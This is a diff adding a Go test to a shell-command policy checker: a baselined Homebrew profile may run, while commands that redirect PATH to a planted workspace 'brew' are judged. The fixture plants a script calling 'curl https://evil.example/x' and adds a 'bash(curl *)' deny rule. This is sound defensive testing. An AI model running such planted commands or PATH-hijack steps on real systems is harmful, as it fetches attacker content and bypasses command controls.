@@ -1,6 +1,7 @@
 package policy
 
 import (
+	"fmt"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -816,6 +817,56 @@ func TestTerminalProgramsHaveTheirCommandsJudged(t *testing.T) {
 		_ = cmd.Run()
 		if _, err := os.Stat(ran); err != nil {
 			t.Error("script -q /dev/null zsh -i -c true did not read .zshrc")
+		}
+	}
+}
+
+// The Homebrew setup the baseline is for: a trusted .zprofile that evals a
+// trusted brew, which sets its own PATH and runs more programs than are
+// looked up. The shell started alone runs; a line that steers it is judged.
+func TestBaselinedHomebrewProfileRuns(t *testing.T) {
+	ws, home := t.TempDir(), t.TempDir()
+	write := func(p, text string, mode os.FileMode) {
+		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(p, []byte(text), mode); err != nil {
+			t.Fatal(err)
+		}
+	}
+	brew := filepath.Join(home, "homebrew", "bin", "brew")
+	var b strings.Builder
+	b.WriteString("#!/bin/bash\nexport PATH=\"/usr/bin:/bin:/usr/sbin:/sbin\"\n")
+	for i := range 40 {
+		fmt.Fprintf(&b, "tool%d --version >/dev/null 2>&1\n", i)
+	}
+	b.WriteString("if [ \"$1\" = shellenv ]; then\n  echo 'export HOMEBREW_PREFIX=\"/opt/homebrew\";'\n" +
+		"  echo 'export PATH=\"/opt/homebrew/bin:/opt/homebrew/sbin${PATH+:$PATH}\";'\nfi\n")
+	write(brew, b.String(), 0o755)
+	prof := filepath.Join(home, ".zprofile")
+	write(prof, "eval \"$("+brew+" shellenv)\"\n", 0o644)
+	write(filepath.Join(ws, "bin", "brew"), "curl https://evil.example/x\n", 0o755)
+	e := New(ModeBypass)
+	e.Roots = func() []string { return []string{ws} }
+	e.Cwd = func() string { return ws }
+	e.Home = func() (string, bool) { return home, true }
+	if err := e.AddDeny("bash(curl *)"); err != nil {
+		t.Fatal(err)
+	}
+	base := map[string]StartupFile{}
+	for _, p := range []string{prof, brew} {
+		size, sum, _ := StartupFileMark(p)
+		base[p] = StartupFile{Size: size, SHA256: sum}
+	}
+	e.StartupBaseline = base
+	judge := func(c string) Result { return e.Evaluate("bash", true, args(map[string]string{"command": c})) }
+	if res := judge("zsh -lc 'echo hi'"); res.Decision != Allow {
+		t.Fatalf("the baselined Homebrew profile: %s (%s)", res.Decision, res.Reason)
+	}
+	for _, c := range []string{"PATH=" + filepath.Join(ws, "bin") + ":$PATH zsh -lc 'echo hi'", "read PATH <<< bin; zsh -lc 'echo hi'",
+		"zsh -c 'path=(bin $path); zsh -lc true'"} {
+		if res := judge(c); res.Decision == Allow {
+			t.Errorf("%q: allowed on the baseline", c)
 		}
 	}
 }
